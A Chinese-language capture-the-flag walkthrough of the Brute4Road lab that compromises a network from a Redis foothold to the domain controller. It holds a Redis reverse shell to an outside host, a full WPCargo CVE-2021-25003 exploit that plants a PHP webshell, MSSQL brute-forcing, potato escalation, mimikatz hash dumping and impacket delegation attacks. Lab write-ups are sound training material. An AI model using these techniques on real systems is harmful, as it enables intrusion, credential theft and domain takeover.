# 春秋云镜-Brute4Road

  
  
&lt;!--more--&gt;  
## flag01  
```bash  
$ nmap -Pn -sT -vv -min-rate 10000 39.98.127.36 -p6379  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 13:35 CST  
Initiating Parallel DNS resolution of 1 host. at 13:35  
Completed Parallel DNS resolution of 1 host. at 13:35, 0.07s elapsed  
Initiating Connect Scan at 13:35  
Scanning 39.98.127.36 [1 port]  
Discovered open port 6379/tcp on 39.98.127.36  
Completed Connect Scan at 13:35, 0.05s elapsed (1 total ports)  
Nmap scan report for 39.98.127.36  
Host is up, received user-set (0.049s latency).  
Scanned at 2025-04-20 13:35:01 CST for 0s  
  
PORT     STATE SERVICE REASON  
6379/tcp open  redis   syn-ack  
  
Read data files from: /opt/homebrew/bin/../share/nmap  
Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds  
```  
存在`redis`未授权服务，直接打`主从复制rce`  
```bash  
root@mail:~/redis-rogue-server-master# python3 redis-rogue-server.py --rhost 39.98.127.36 --rport 6379 --  
lhost 8.137.71.171 --lport 1234  
______         _ _      ______                         _____                            
| ___ \       | (_)     | ___ \                       /  ___|                           
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __   
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ &#39;__\ \ / / _ \ &#39;__|  
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |     
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|     
                                     __/ |                                              
                                    |___/                                               
@copyright n0b0dy @ r3kapig  
  
[info] TARGET 39.98.127.36:6379  
[info] SERVER 8.137.71.171:1234  
[info] Setting master...  
[info] Setting dbfilename...  
[info] Loading module...  
[info] Temerory cleaning up...  
What do u want, [i]nteractive shell or [r]everse shell: r  
[info] Open reverse shell...  
Reverse server address: 8.137.71.171  
Reverse server port: 1235  
[info] Reverse shell payload sent.  
[info] Check at 8.137.71.171:1235  
[info] Unload module...  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201336987.png)
利用`suid`提权  
`find / -perm -u=s -type f 2&gt;/dev/null`  
```bash  
[redis@centos-web01 tmp]$ find / -perm -u=s -type f 2&gt;/dev/null  
find / -perm -u=s -type f 2&gt;/dev/null  
/usr/sbin/pam_timestamp_check  
/usr/sbin/usernetctl  
/usr/sbin/unix_chkpwd  
/usr/bin/at  
/usr/bin/chfn  
/usr/bin/gpasswd  
/usr/bin/passwd  
/usr/bin/chage  
/usr/bin/base64  
/usr/bin/umount  
/usr/bin/su  
/usr/bin/chsh  
/usr/bin/sudo  
/usr/bin/crontab  
/usr/bin/newgrp  
/usr/bin/mount  
/usr/bin/pkexec  
/usr/libexec/dbus-1/dbus-daemon-launch-helper  
/usr/lib/polkit-1/polkit-agent-helper-1  
```  
`base64`提权  
```bash  
[redis@centos-web01 tmp]$ base64 &#34;/home/redis/flag/flag01&#34; | base64 --decode  
base64 &#34;/home/redis/flag/flag01&#34; | base64 --decode  
 ██████                    ██              ██  ███████                           ██  
░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██  
░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██  
░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████  
░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██  
░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██  
░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████  
░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░   
  
  
flag01: flag{fa2cf8ca-3b47-4ba7-8110-b807f44adc95}  
  
Congratulations! ! !  
Guess where is the second flag?  
```  
## flag02  
`wget`下载`frp`进行代理  
`nohup ./frpc -c frpc.ini &gt;/dev/null 2&gt;&amp;1 &amp;`  
获得内网IP地址，进行`fscan`扫描  
```bash  
cat /etc/hosts  
::1     localhost       localhost.localdomain   localhost6      localhost6.localdomain6  
127.0.0.1       localhost       localhost.localdomain   localhost4      localhost4.localdomain4  
  
172.22.2.7      centos-web01    centos-web01  
```  
`fscan -h 172.22.2.7/24`  
```bash  
[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.7/24  
./fscan -h 172.22.2.7/24  
  
   ___                              _      
  / _ \     ___  ___ _ __ __ _  ___| | __   
 / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /  
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;      
\____/     |___/\___|_|  \__,_|\___|_|\_\     
                     fscan version: 1.8.3  
start infoscan  
trying RunIcmp2  
The current user permissions unable to send icmp packets  
start ping  
(icmp) Target 172.22.2.18     is alive  
(icmp) Target 172.22.2.16     is alive  
(icmp) Target 172.22.2.3      is alive  
(icmp) Target 172.22.2.7      is alive  
(icmp) Target 172.22.2.34     is alive  
[*] Icmp alive hosts len is: 5  
172.22.2.7:22 open  
172.22.2.7:21 open  
172.22.2.18:80 open  
172.22.2.7:80 open  
172.22.2.18:22 open  
172.22.2.7:6379 open  
172.22.2.3:88 open  
172.22.2.18:445 open  
172.22.2.16:1433 open  
172.22.2.34:445 open  
172.22.2.16:445 open  
172.22.2.3:445 open  
172.22.2.34:139 open  
172.22.2.16:139 open  
172.22.2.34:135 open  
172.22.2.3:139 open  
172.22.2.18:139 open  
172.22.2.16:135 open  
172.22.2.3:135 open  
172.22.2.16:80 open  
172.22.2.34:7680 open  
[*] alive ports len is: 21  
start vulscan  
[*] NetInfo   
[*]172.22.2.16  
   [-&gt;]MSSQLSERVER  
   [-&gt;]172.22.2.16  
[*] NetInfo   
[*]172.22.2.3  
   [-&gt;]DC  
   [-&gt;]172.22.2.3  
[*] OsInfo 172.22.2.3   (Windows Server 2016 Datacenter 14393)  
[*] NetBios 172.22.2.34     XIAORANG\CLIENT01               
[*] NetBios 172.22.2.3      [&#43;] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393  
[*] NetInfo   
[*]172.22.2.34  
   [-&gt;]CLIENT01  
   [-&gt;]172.22.2.34  
[*] OsInfo 172.22.2.16  (Windows Server 2016 Datacenter 14393)  
[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393  
[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found  
[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS  
[*] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02          
[&#43;] ftp 172.22.2.7:21:anonymous   
   [-&gt;]pub  
[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点  
已完成 21/21  
[*] 扫描结束,耗时: 13.155899674s  
```  
扫描到一个`wordpress`站点  
http://172.22.2.18/  
存在[WPCargo &lt; 6.9.0 – 未经身份验证的 RCE | CVE 2021-25003 | 插件漏洞](https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/)  
```python  
import sys  
import binascii  
import requests  
  
# This is a magic string that when treated as pixels and compressed using the png  
# algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file  
payload = &#39;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#39;  
  
def encode_character_code(c: int):  
    return &#39;{:08b}&#39;.format(c).replace(&#39;0&#39;, &#39;x&#39;)  
  
text = &#39;&#39;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]  
  
destination_url = &#39;http://172.22.2.18/&#39;  
cmd = &#39;ls&#39;  
  
# With 1/11 scale, &#39;1&#39;s will be encoded as single white pixels, &#39;x&#39;s as single black pixels.  
requests.get(  
    f&#34;{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&#34;  
)  
  
# We have uploaded a webshell - now let&#39;s use it to execute a command.  
print(requests.post(  
    f&#34;{destination_url}webshell.php?1=system&#34;, data={&#34;2&#34;: cmd}  
).content.decode(&#39;ascii&#39;, &#39;ignore&#39;))  
```  
蚁剑连接  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201421091.png)
`wp-config.php`中找到数据库账号和密码进行连接  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423118.png)
找到第二个`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201423562.png)
## flag03  
还存在一个密码表,导出进行爆破其他主机的服务   
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201425076.png)
通过`fscan`扫描结果，得知还有几台主机，其中`16`存在`mssql`  
```  
(icmp) Target 172.22.2.18     is alive  
(icmp) Target 172.22.2.16     is alive  
(icmp) Target 172.22.2.3      is alive  
(icmp) Target 172.22.2.7      is alive  
(icmp) Target 172.22.2.34     is alive  
```  
这里重点关注一下，利用`fscan`进行爆破一下  
```bash  
[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.16 -m mssql -u sa -pwdf password.txt  
&lt;/fscan -h 172.22.2.16 -m mssql -u sa -pwdf password.txt                       
  
   ___                              _      
  / _ \     ___  ___ _ __ __ _  ___| | __   
 / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /  
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;      
\____/     |___/\___|_|  \__,_|\___|_|\_\     
                     fscan version: 1.8.3  
-m  mssql  start scan the port: 1433  
start infoscan  
172.22.2.16:1433 open  
[*] alive ports len is: 1  
start vulscan  
[&#43;] mssql 172.22.2.16:1433:sa ElGNkOiC  
已完成 2/2  
[*] 扫描结束,耗时: 945.630414ms  
```  
得到用户名和密码  
`sa/ElGNkOiC`，利用`MDUT`进行利用  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201438814.png)
存在`SeImpersonatePrivilege`权限  
这里，激活`OLE`组件，上传脏土豆进行提权  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201440446.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504201441775.png)
## flag04  
`C:/Users/Public/SweetPotato-new.exe -a &#34;netstat -ano&#34;`  
`3389`是开启的状态，直接添加用户连`3389`  
```  
C:/Users/Public/SweetPotato-new.exe -a &#34;net user huahua 123@qwer! /add&#34;  
C:/Users/Public/SweetPotato-new.exe -a &#34;net localgroup administrators huahua /add&#34;  
```  
`systeminfo`  
```powershell  
C:\Windows\system32&gt;systeminfo  
  
主机名:           MSSQLSERVER  
OS 名称:          Microsoft Windows Server 2016 Datacenter  
OS 版本:          10.0.14393 暂缺 Build 14393  
OS 制造商:        Microsoft Corporation  
OS 配置:          成员服务器  
OS 构件类型:      Multiprocessor Free  
注册的所有人:  
注册的组织:       Aliyun  
产品 ID:          00376-40000-00000-AA947  
初始安装日期:     2022/6/8, 16:30:01  
系统启动时间:     2025/4/20, 14:13:13  
系统制造商:       Alibaba Cloud  
系统型号:         Alibaba Cloud ECS  
系统类型:         x64-based PC  
处理器:           安装了 1 个处理器。  
                  [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz  
BIOS 版本:        SeaBIOS 449e491, 2014/4/1  
Windows 目录:     C:\Windows  
系统目录:         C:\Windows\system32  
启动设备:         \Device\HarddiskVolume1  
系统区域设置:     zh-cn;中文(中国)  
输入法区域设置:   zh-cn;中文(中国)  
时区:             (UTC&#43;08:00) 北京，重庆，香港特别行政区，乌鲁木齐  
物理内存总量:     3,950 MB  
可用的物理内存:   1,411 MB  
虚拟内存: 最大值: 4,654 MB  
虚拟内存: 可用:   1,017 MB  
虚拟内存: 使用中: 3,637 MB  
页面文件位置:     C:\pagefile.sys  
域:               xiaorang.lab  
登录服务器:       \\MSSQLSERVER  
修补程序:         安装了 6 个修补程序。  
                  [01]: KB5013625  
                  [02]: KB4049065  
                  [03]: KB4486129  
                  [04]: KB4486131  
                  [05]: KB5014026  
                  [06]: KB5013952  
网卡:             安装了 1 个 NIC。  
                  [01]: Red Hat VirtIO Ethernet Adapter  
                      连接名:      以太网  
                      启用 DHCP:   是  
                      DHCP 服务器: 172.22.255.253  
                      IP 地址  
                        [01]: 172.22.2.16  
                        [02]: fe80::f40c:c014:4749:a945  
Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。  
```  
在域中`xiaorang.lab`，并且是`MSSQLSERVER`的机器  
这里查询是否配置了委约派  
```  
C:\Users\Public\SweetPotato-new.exe -a &#34;C:\Users\huahua\Desktop\SharpHound.exe -c all --outputdirectory  C:\Users\huahua\Desktop&#34;  
```  
利用`BloodHound`进行分析  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504202054064.png)
这里打委约派攻击，  
上传`mimikatz`  
```  
privilege::debug  
sekurlsa::logonpasswords  
  
Authentication Id : 0 ; 22979 (00000000:000059c3)  
Session           : UndefinedLogonType from 0  
User Name         : (null)  
Domain            : (null)  
Logon Server      : (null)  
Logon Time        : 2025/4/20 14:13:18  
SID               :  
        msv :  
         [00000003] Primary  
         * Username : MSSQLSERVER$  
         * Domain   : XIAORANG  
         * NTLM     : 3cc99e5b42d8fbd35f3b3883898bc14c  
         * SHA1     : bde131b5b522f3d9441a5d321694ea692729dfb4  
        tspkg :  
        wdigest :  
        kerberos :  
        ssp :  
        credman :  
  
```  
得到`MSSQLSERVER$`的`NTLM Hash 3cc99e5b42d8fbd35f3b3883898bc14c`  
```  
$ python3 getST.py -dc-ip 172.22.2.3 xiaorang.lab/MSSQLSERVER$ -hashes :3cc99e5b42d8fbd35f3b3883898bc14c -spn CIFS/DC.xiaorang.lab -impersonate Administrator  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[-] CCache file is not found. Skipping...  
[*] Getting TGT for user  
[*] Impersonating Administrator  
[*] Requesting S4U2self  
[*] Requesting S4U2Proxy  
[*] Saving ticket in Administrator@CIFS_DC.xiaorang.lab@XIAORANG.LAB.ccache  
```  
导入票据  
`export KRB5CCNAME=Administrator@CIFS_DC.xiaorang.lab@XIAORANG.LAB.ccache`  
在`/etc/hosts`添加域  
`172.22.2.3 DC.xiaorang.lab`  
```bash  
$ python3 smbexec.py -no-pass -k DC.xiaorang.lab  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
[!] Launching semi-interactive shell - Careful what you execute  
C:\Windows\system32&gt;whoami  
nt authority\system  
  
C:\Windows\system32&gt;type C:\Users\Administrator\flag\flag04.txt  
 ######:                                               ###   ######:                             ##  
 #######                         ##                   :###   #######                             ##  
 ##   :##                        ##                  .####   ##   :##                            ##  
 ##    ##   ##.####  ##    ##  #######    .####:     ##.##   ##    ##   .####.    :####     :###.##  
 ##   :##   #######  ##    ##  #######   .######:   :#: ##   ##   :##  .######.   ######   :#######  
 #######.   ###.     ##    ##    ##      ##:  :##  .##  ##   #######:  ###  ###   #:  :##  ###  ###  
 #######.   ##       ##    ##    ##      ########  ##   ##   ######    ##.  .##    :#####  ##.  .##  
 ##   :##   ##       ##    ##    ##      ########  ########  ##   ##.  ##    ##  .#######  ##    ##  
 ##    ##   ##       ##    ##    ##      ##        ########  ##   ##   ##.  .##  ## .  ##  ##.  .##  
 ##   :##   ##       ##:  ###    ##.     ###.  :#       ##   ##   :##  ###  ###  ##:  ###  ###  ###  
 ########   ##        #######    #####   .#######       ##   ##    ##: .######.  ########  :#######  
 ######     ##         ###.##    .####    .#####:       ##   ##    ###  .####.     ###.##   :###.##  
  
  
Well done hacking!  
This is the final flag, you deserve it!  
  
  
flag04: flag{4afa2f09-7339-4191-afee-ad092d04f551}  
```  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road/  

